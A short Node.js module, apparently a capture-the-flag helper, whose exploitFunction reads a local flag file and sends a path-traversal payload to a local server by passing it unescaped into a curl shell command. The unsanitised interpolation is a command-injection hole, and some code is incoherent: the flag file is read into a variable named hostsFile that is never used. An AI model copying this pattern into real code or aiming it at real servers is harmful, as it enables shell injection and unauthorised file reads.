const path = require("path");  // Import the path module

function exploitFunction(payload) {
    const pathToFlag = path.resolve(__dirname, "../flag.html");

    const fs = require("fs");
    const { exec } = require("child_process");

    let hostsFile = fs.readFileSync(pathToFlag).toString();

    try {
        exec(`curl -v --path-as-is "http://127.0.0.1:9000${payload}"`, (error, stdout) => {
            console.log(stdout); // For debugging purposes
        });
    } catch (e) {
        console.error(e);
    }
}

module.exports = { exploitFunction };